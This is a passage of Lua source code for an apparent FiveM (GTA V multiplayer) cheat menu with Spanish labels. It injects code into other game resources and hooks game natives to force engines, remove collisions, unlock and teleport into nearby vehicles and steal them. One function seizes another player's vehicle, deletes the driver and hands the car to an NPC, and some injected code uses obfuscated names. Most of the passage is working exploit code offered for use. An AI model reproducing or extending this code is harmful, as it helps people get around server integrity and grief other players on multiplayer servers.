                        AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                    end
                end
            end)
        ]])
    else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end

        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end

        CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Wait(10)
                        timeout = timeout + 1
                    end
                end
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Wait(100)

            local wall2Positions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = wall2Positions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
    end
end

local function ToggleForceVehicleEngine(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local susano = rawget(_G, "Susano")

            if susano and type(susano) == "table" and type(susano.HookNative) == "function" and not _force_engine_hooks_applied then
                _force_engine_hooks_applied = true

                susano.HookNative(0x8DE82BC774F3B862, function(entity)
                    return true
                end)

                susano.HookNative(0x4CEBC1ED31E8925E, function(entity)
                    return true
                end)

                susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                    return true
                end)

                susano.HookNative(0x2B40A976, function(entity)
                    return true
                end)

                susano.HookNative(0xAD738C3085FE7E11, function(entity, p1, p2)
                    return true
                end)
            end

            _G.ForceVehicleEngineEnabled = %s

            if _G.ForceVehicleEngineThread then
            end

            _G.ForceVehicleEngineThread = CreateThread(function()
                while _G.ForceVehicleEngineEnabled do
                    Wait(0)

                    local ped = PlayerPedId()
                    local vehicle = GetVehiclePedIsIn(ped, false)

                    if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                        if not NetworkHasControlOfEntity(vehicle) then
                            NetworkRequestControlOfEntity(vehicle)
                        end

                        SetVehicleEngineOn(vehicle, true, true, false)

                        SetVehicleEngineHealth(vehicle, 1000.0)

                        SetVehicleUndriveable(vehicle, false)
                    end
                end

                _G.ForceVehicleEngineThread = nil
            end)
        ]], tostring(enable)))
    end
end

local function ToggleShiftBoost(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
            QwErTyUiOpSh = %s

            if QwErTyUiOpSh then
                local function ZxCvBnMmLl()
                    CreateThread(function()
                        while QwErTyUiOpSh and not Unloaded do
                            local ped = PlayerPedId()
                            if IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh ~= 0 and IsDisabledControlJustPressed(0, 21) then
                                    SetVehicleForwardSpeed(veh, 150.0)
                                end
                            end
                            Wait(0)
                        end
                    end)
                end
                ZxCvBnMmLl()
            end
        ]], tostring(enable)))
    end
end

local spawnItems = {"Coche", "Moto", "Avion", "Barco"}
for _, itemName in ipairs(spawnItems) do
    local item = FindItem("Vehiculo", "Spawnear", itemName)
    if item then
        item.onClick = function(index, option)
            SpawnVehicle(option)
        end
    end
end

Actions.maxUpgradeItem = FindItem("Vehiculo", "Rendimiento", "Mejora maxima")
if Actions.maxUpgradeItem then
    Actions.maxUpgradeItem.onClick = function()
        MaxUpgrade()
    end
end

Actions.repairVehicleItem = FindItem("Vehiculo", "Rendimiento", "Reparar vehiculo")
if Actions.repairVehicleItem then
    Actions.repairVehicleItem.onClick = function()
        RepairVehicle()
    end
end

Actions.throwFromVehicleItem = FindItem("Vehiculo", "Rendimiento", "Lanzar desde vehiculo")
if Actions.throwFromVehicleItem then
    Actions.throwFromVehicleItem.onClick = function()
        local isEnabled = Actions.throwFromVehicleItem.value

        if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
            return
        end

        if isEnabled then
            Susano.InjectResource("any", [[
                rawset(_G, 'ThrowFromVehicleEnabled', true)

                if not rawget(_G, 'ThrowFromVehicleThread') then
                    rawset(_G, 'ThrowFromVehicleThread', true)

                    CreateThread(function()
                        while not Unloaded do
                            if rawget(_G, 'ThrowFromVehicleEnabled') then
                                SetRelationshipBetweenGroups(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                            else
                                SetRelationshipBetweenGroups(1, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                                SetRelationshipBetweenGroups(0, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                            end
                            Wait(0)
                        end

                        SetRelationshipBetweenGroups(1, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                        SetRelationshipBetweenGroups(0, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                    end)
                end
            ]])
        else
            Susano.InjectResource("any", [[
                rawset(_G, 'ThrowFromVehicleEnabled', false)
                SetRelationshipBetweenGroups(1, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                SetRelationshipBetweenGroups(0, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                ClearRelationshipBetweenGroups(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
            ]])
        end
    end
end

local function ToggleEasyHandling(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            if _G.EasyHandlingEnabled == nil then _G.EasyHandlingEnabled = false end
            _G.EasyHandlingEnabled = %s

            if _G.EasyHandlingEnabled then
                local function StartEasyHandling()
                    CreateThread(function()
                        while _G.EasyHandlingEnabled and not Unloaded do
                        Wait(0)
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                    SetVehicleGravityAmount(veh, 73.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 500.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 5.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionLossMult", 0.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fLowSpeedTractionLossMult", 0.0)
                                    SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 40.0)
                                    ModifyVehicleTopSpeed(veh, 1.5)
                            end
                        end
                    end
                end)
                end
                StartEasyHandling()
            else
                local ped = PlayerPedId()
                if ped and ped ~= 0 then
                    local veh = GetVehiclePedIsIn(ped, false)
                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                        SetVehicleGravityAmount(veh, 9.8)
                        SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 1500.0)
                        SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0)
                        ModifyVehicleTopSpeed(veh, 1.0)
                    end
                end
            end
        ]], tostring(enable)))
    end
end

Actions.forceEngineItem = FindItem("Vehiculo", "Rendimiento", "Forzar motor encendido")
if Actions.forceEngineItem then
    Actions.forceEngineItem.onClick = function(value)
        ToggleForceVehicleEngine(value)
    end
end

Actions.easyHandlingItem = FindItem("Vehiculo", "Rendimiento", "Manejo facil")
if Actions.easyHandlingItem then
    Actions.easyHandlingItem.onClick = function(value)
        ToggleEasyHandling(value)
    end
end

local function ToggleNoCollision(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityNoCollisionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)

            if not _G.no_vehicle_collision_active then
                _G.no_vehicle_collision_active = false
            end
            _G.no_vehicle_collision_active = %s

            if _G.no_vehicle_collision_active then
                CreateThread(function()
                    while _G.no_vehicle_collision_active do
                        Wait(0)

                        local ped = PlayerPedId()
                        if IsPedInAnyVehicle(ped, false) then
                            local veh = GetVehiclePedIsIn(ped, false)
                            if veh and veh ~= 0 then
                                SetEntityNoCollisionEntity(veh, veh, false)

                                local myCoords = GetEntityCoords(veh)
                                local vehHandle, otherVeh = FindFirstVehicle()
                                local success

                                repeat
                                    if otherVeh ~= veh and DoesEntityExist(otherVeh) then
                                        local otherCoords = GetEntityCoords(otherVeh)
                                        local distance = #(myCoords - otherCoords)

                                        if distance < 50.0 then
                                            SetEntityNoCollisionEntity(veh, otherVeh, true)
                                            SetEntityNoCollisionEntity(otherVeh, veh, true)
                                        end
                                    end

                                    success, otherVeh = FindNextVehicle(vehHandle)
                                until not success

                                EndFindVehicle(vehHandle)
                            end
                        end
                    end
                end)
            end
        ]], tostring(enable)))
    else
        if enable then
            rawset(_G, 'no_vehicle_collision_active', true)

            CreateThread(function()
                while rawget(_G, 'no_vehicle_collision_active') do
                    Wait(0)

                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            SetEntityNoCollisionEntity(veh, veh, false)

                            local myCoords = GetEntityCoords(veh)
                            local vehHandle, otherVeh = FindFirstVehicle()
                            local success

                            repeat
                                if otherVeh ~= veh and DoesEntityExist(otherVeh) then
                                    local otherCoords = GetEntityCoords(otherVeh)
                                    local distance = #(myCoords - otherCoords)

                                    if distance < 50.0 then
                                        SetEntityNoCollisionEntity(veh, otherVeh, true)
                                        SetEntityNoCollisionEntity(otherVeh, veh, true)
                                    end
                                end

                                success, otherVeh = FindNextVehicle(vehHandle)
                            until not success

                            EndFindVehicle(vehHandle)
                        end
                    end
                end
            end)
        else
            rawset(_G, 'no_vehicle_collision_active', false)
        end
    end
end

local function ToggleBunnyHop(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("ApplyForceToEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsDisabledControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("GetGameTimer", function(originalFn, ...) return originalFn(...) end)

            if not _G.bunny_hop_active then
                _G.bunny_hop_active = false
            end
            _G.bunny_hop_active = %s

            if _G.bunny_hop_active then
                CreateThread(function()
                    local lastJumpTime = 0
                    while _G.bunny_hop_active do
                        Wait(0)

                        local ped = PlayerPedId()
                        if IsPedInAnyVehicle(ped, false) then
                            local veh = GetVehiclePedIsIn(ped, false)
                            if veh and veh ~= 0 then
                                local currentTime = GetGameTimer()
                                if IsControlJustPressed(0, 22) and (currentTime - lastJumpTime) > 200 then
                                    if not NetworkHasControlOfEntity(veh) then
                                        NetworkRequestControlOfEntity(veh)
                                    end

                                    ApplyForceToEntity(veh, 1, 0.0, 0.0, 12.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                    lastJumpTime = currentTime
                                end
                            end
                        end
                    end
                end)
            end
        ]], tostring(enable)))
    else
        if enable then
            rawset(_G, 'bunny_hop_active', true)

            CreateThread(function()
                local lastJumpTime = 0
                while rawget(_G, 'bunny_hop_active') do
                    Wait(0)

                    local ped = PlayerPedId()
                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        if veh and veh ~= 0 then
                            local currentTime = GetGameTimer()
                            if IsControlJustPressed(0, 22) and (currentTime - lastJumpTime) > 200 then
                                if not NetworkHasControlOfEntity(veh) then
                                    NetworkRequestControlOfEntity(veh)
                                end

                                ApplyForceToEntity(veh, 1, 0.0, 0.0, 12.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                lastJumpTime = currentTime
                            end
                        end
                    end
                end
            end)
        else
            rawset(_G, 'bunny_hop_active', false)
        end
    end
end

function Menu.ActionChangePlate()
    if Menu and Menu.OpenInput then
        Menu.OpenInput("Cambiar matricula", "Escribe el texto de la matricula (max 8 caracteres):", function(input)
            if input and input ~= "" then
                local plateText = string.sub(input, 1, 8)
                if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                    Susano.InjectResource("any", string.format([[
                        local playerPed = PlayerPedId()
                        if not playerPed or not DoesEntityExist(playerPed) then return end

                        local vehicle = GetVehiclePedIsIn(playerPed, false)
                        if vehicle == 0 or not DoesEntityExist(vehicle) then
                            local coords = GetEntityCoords(playerPed)
                            vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
                        end

                        if vehicle ~= 0 and DoesEntityExist(vehicle) then
                            SetVehicleNumberPlateText(vehicle, "%s")
                            SetVehicleNumberPlateTextIndex(vehicle, 0)
                        end
                    ]], plateText))
                end
            end
        end)
    end
end

function Menu.ActionCleanVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end

            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if vehicle == 0 or not DoesEntityExist(vehicle) then
                local coords = GetEntityCoords(playerPed)
                vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
            end

            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetVehicleDirtLevel(vehicle, 0.0)
                WashDecalsFromVehicle(vehicle, 1.0)
                SetVehicleFixed(vehicle)
                SetVehicleDeformationFixed(vehicle)
                SetVehicleUndriveable(vehicle, false)
                SetVehicleEngineOn(vehicle, true, true, false)
            end
        ]])
    end
end

function Menu.ActionFlipVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local function vXmYLT9pq2()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetEntityHeading
                local d = SetEntityRotation

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    d(veh, 0.0, 0.0, c(veh))
                end
            end

            vXmYLT9pq2()
        ]])
    end
end

local function ToggleBackFlip(enable)
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            if BackFlipEnabled == nil then BackFlipEnabled = false end
            BackFlipEnabled = %s

            if BackFlipEnabled then
                CreateThread(function()
                    while BackFlipEnabled and not Unloaded do
                        Wait(0)

                        if IsControlJustPressed(0, 22) then
                            local playerPed = PlayerPedId()
                            local playerVeh = GetVehiclePedIsIn(playerPed, true)

                            if DoesEntityExist(playerVeh) then
                                ApplyForceToEntity(
                                    playerVeh,
                                    1,
                                    0.0, 0.0, 15.0,
                                    0.0, 60.0, 0.0,
                                    0,
                                    false, true, true, false, true
                                )
                            end
                        end
                    end
                end)
            end
        ]], tostring(enable)))
    end
end

function Menu.ActionNPCDrive()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        local code = string.format([[
CreateThread(function()
    if rawget(_G, 'warp_boost_busy') then return end
    rawset(_G, 'warp_boost_busy', true)

    local targetServerId = %d

    local targetPlayerId = nil
    for _, player in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(player) == targetServerId then
            targetPlayerId = player
            break
        end
    end

    if not targetPlayerId then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    if not IsPedInAnyVehicle(targetPed, false) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
    if not DoesEntityExist(targetVehicle) then
        rawset(_G, 'warp_boost_busy', false)
        return
    end

    local playerPed = PlayerPedId()
    local initialCoords = GetEntityCoords(playerPed)
    local initialHeading = GetEntityHeading(playerPed)

    local function RequestControl(entity, timeoutMs)
        if not entity or not DoesEntityExist(entity) then return false end
        local start = GetGameTimer()
        NetworkRequestControlOfEntity(entity)
        while not NetworkHasControlOfEntity(entity) do
            Wait(0)
            if GetGameTimer() - start > (timeoutMs or 500) then
                return false
            end
            NetworkRequestControlOfEntity(entity)
        end
        return true
    end

    RequestControl(targetVehicle, 800)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local function tryEnterSeat(seatIndex)
        SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
        Wait(0)
        return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
    end

    local function getFirstFreeSeat(v)
        local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
        if not numSeats or numSeats <= 0 then return -1 end
        for seat = 0, (numSeats - 2) do
            if IsVehicleSeatFree(v, seat) then return seat end
        end
        return -1
    end

    ClearPedTasksImmediately(playerPed)
    SetVehicleDoorsLocked(targetVehicle, 1)
    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

    local takeoverSuccess = false
    local tStart = GetGameTimer()

    while (GetGameTimer() - tStart) < 1000 do
        RequestControl(targetVehicle, 400)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            takeoverSuccess = true
            break
        end

        if not IsPedInVehicle(playerPed, targetVehicle, false) then
            local fs = getFirstFreeSeat(targetVehicle)
            if fs ~= -1 then
                tryEnterSeat(fs)
            end
        end

        local drv = GetPedInVehicleSeat(targetVehicle, -1)
        if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
            RequestControl(drv, 400)
            ClearPedTasksImmediately(drv)
            SetEntityAsMissionEntity(drv, true, true)
            SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
            Wait(20)
            DeleteEntity(drv)
        end

        local t0 = GetGameTimer()
        while (GetGameTimer() - t0) < 400 do
            local occ = GetPedInVehicleSeat(targetVehicle, -1)
            if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
            Wait(0)
        end

        local t1 = GetGameTimer()
        while (GetGameTimer() - t1) < 500 do
            if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                takeoverSuccess = true
                break
            end
            Wait(0)
        end
        if takeoverSuccess then break end
        Wait(0)
    end

    if takeoverSuccess then
        Wait(500)
        SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
        SetEntityHeading(playerPed, initialHeading)

        if DoesEntityExist(targetVehicle) then
            RequestControl(targetVehicle, 1000)

            local model = GetHashKey("s_m_y_marine_01")
            RequestModel(model)
            local tModel = GetGameTimer()
            while not HasModelLoaded(model) and (GetGameTimer() - tModel) < 2000 do Wait(0) end

            if HasModelLoaded(model) then
                local npc = CreatePedInsideVehicle(targetVehicle, 4, model, -1, false, false)

                if not DoesEntityExist(npc) then
                    local vehCoords = GetEntityCoords(targetVehicle)
                    npc = CreatePed(4, model, vehCoords.x, vehCoords.y, vehCoords.z + 2.0, 0.0, false, false)
                    if DoesEntityExist(npc) then
                        SetPedIntoVehicle(npc, targetVehicle, -1)
                    end
                end

                if DoesEntityExist(npc) then
                    SetEntityAsMissionEntity(npc, true, false)
                    SetBlockingOfNonTemporaryEvents(npc, true)
                    SetPedRandomComponentVariation(npc, 0)

                    Wait(200)
                    TaskVehicleDriveWander(npc, targetVehicle, 30.0, 786603)
                end
            end
        end
    else
        local dist = #(GetEntityCoords(playerPed) - initialCoords)
        if dist > 10.0 then
            SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false, false)
        end
    end

    rawset(_G, 'warp_boost_busy', false)
end)
        ]], targetServerId)

        Susano.InjectResource("any", WrapWithVehicleHooks(code))
    end
end

function Menu.ActionDeleteVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end

            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if vehicle == 0 or not DoesEntityExist(vehicle) then
                local coords = GetEntityCoords(playerPed)
                vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 10.0, 0, 70)
            end

            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityAsMissionEntity(vehicle, true, true)
                if NetworkGetEntityIsNetworked(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local attempts = 0
                    while not NetworkHasControlOfEntity(vehicle) and attempts < 50 do
                        Wait(0)
                        attempts = attempts + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end
                DeleteEntity(vehicle)
            end
        ]])
    end
end

CreateThread(function()
    while true do
        Wait(500)
        if Menu.unlockAllVehicleEnabled then
            local ped = PlayerPedId()
            if IsPedOnFoot(ped) then
                local pos = GetEntityCoords(ped)
                local veh = GetClosestVehicle(pos, 3.5, 0, 70)

                if veh ~= 0 then
                    local locked = GetVehicleDoorLockStatus(veh)

                    if locked > 1 then
                        SetVehicleDoorsLocked(veh, 1)
                        SetVehicleDoorsLockedForAllPlayers(veh, false)
                        SetVehicleDoorsLockedForPlayer(veh, PlayerId(), false)
                    end
                end
            end
    end
end
end)

function Menu.ActionTeleportIntoClosestVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end

            if IsPedInAnyVehicle(playerPed, false) then return end

            local coords = GetEntityCoords(playerPed)
            local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 200.0, 0, 70)

            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityAsMissionEntity(vehicle, true, true)
                if NetworkGetEntityIsNetworked(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local attempts = 0
                    while not NetworkHasControlOfEntity(vehicle) and attempts < 100 do
                        Wait(0)
                        attempts = attempts + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end

                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)

                local freeSeat = -1
                local maxSeats = GetVehicleMaxNumberOfPassengers(vehicle)

                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    freeSeat = -1
                else
                    for i = 0, maxSeats - 1 do
                        if GetPedInVehicleSeat(vehicle, i) == 0 then
                            freeSeat = i
                            break
                        end
                    end
                end

                if freeSeat ~= -1 then
                    ClearPedTasksImmediately(playerPed)
                    Wait(50)
                    SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    Wait(100)

                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        local vehicleCoords = GetEntityCoords(vehicle)
                        SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                        Wait(50)
                        SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    end

                else
                end
            else
            end
        ]])
    end
end

function Menu.ActionGiveNearestVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end

            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)

            local coords = GetEntityCoords(playerPed)
            local vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 200.0, 0, 70)

            if vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetEntityAsMissionEntity(vehicle, true, true)
                if NetworkGetEntityIsNetworked(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local attempts = 0
                    while not NetworkHasControlOfEntity(vehicle) and attempts < 100 do
                        Wait(0)
                        attempts = attempts + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end

                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)

                local freeSeat = -1
                local maxSeats = GetVehicleMaxNumberOfPassengers(vehicle)

                if GetPedInVehicleSeat(vehicle, -1) == 0 then
                    freeSeat = -1
                else
                    for i = 0, maxSeats - 1 do
                        if GetPedInVehicleSeat(vehicle, i) == 0 then
                            freeSeat = i
                            break
                        end
                    end
                end

                if freeSeat ~= -1 then
                    ClearPedTasksImmediately(playerPed)
                    Wait(50)
                    SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    Wait(100)

                    if not IsPedInVehicle(playerPed, vehicle, false) then
                        local vehicleCoords = GetEntityCoords(vehicle)
                        SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                        Wait(50)
                        SetPedIntoVehicle(playerPed, vehicle, freeSeat)
                    end

                    Wait(200)
                    if IsPedInVehicle(playerPed, vehicle, false) then
                        SetEntityCoordsNoOffset(vehicle, playerCoords.x, playerCoords.y, playerCoords.z, false, false, false)
                        SetEntityHeading(vehicle, playerHeading)
                        SetVehicleOnGroundProperly(vehicle)
                        SetVehicleEngineOn(vehicle, true, true, false)

                        local networkId = NetworkGetNetworkIdFromEntity(vehicle)
                        if networkId ~= 0 then
                            SetNetworkIdCanMigrate(networkId, true)
                            SetNetworkIdExistsOnAllMachines(networkId, true)
                        end

                    end
                else
                end
            else
            end
        ]])
    end
end

Actions.changePlateItem = FindItem("Vehiculo", "Rendimiento", "Cambiar matricula")
if Actions.changePlateItem then
    Actions.changePlateItem.onClick = function()
        Menu.ActionChangePlate()
    end
end

Actions.cleanVehicleItem = FindItem("Vehiculo", "Rendimiento", "Limpiar vehiculo")
if Actions.cleanVehicleItem then
    Actions.cleanVehicleItem.onClick = function()
        Menu.ActionCleanVehicle()
    end
end

Actions.flipVehicleItem = FindItem("Vehiculo", "Rendimiento", "Enderezar vehiculo")
if Actions.flipVehicleItem then
    Actions.flipVehicleItem.onClick = function()
        Menu.ActionFlipVehicle()
    end
end

Actions.deleteVehicleItem = FindItem("Vehiculo", "Rendimiento", "Eliminar vehiculo")
if Actions.deleteVehicleItem then
    Actions.deleteVehicleItem.onClick = function()
        Menu.ActionDeleteVehicle()
    end
end

Actions.unlockAllVehicleItem = FindItem("Vehiculo", "Rendimiento", "Desbloquear todos los vehiculos")
if Actions.unlockAllVehicleItem then
    Actions.unlockAllVehicleItem.onClick = function(value)
        Menu.unlockAllVehicleEnabled = value
    end
end

Actions.teleportIntoItem = FindItem("Vehiculo", "Rendimiento", "TP al vehiculo mas cercano")
if Actions.teleportIntoItem then
    Actions.teleportIntoItem.onClick = function()
        Menu.ActionTeleportIntoClosestVehicle()
    end
end

Actions.giveNearestItem = FindItem("Vehiculo", "Rendimiento", "Regalar vehiculo mas cercano")
if Actions.giveNearestItem then
    Actions.giveNearestItem.onClick = function()
        Menu.ActionGiveNearestVehicle()
    end
end

Actions.giveRampWallItem = FindItem("Vehiculo", "Rendimiento", "Regalar")
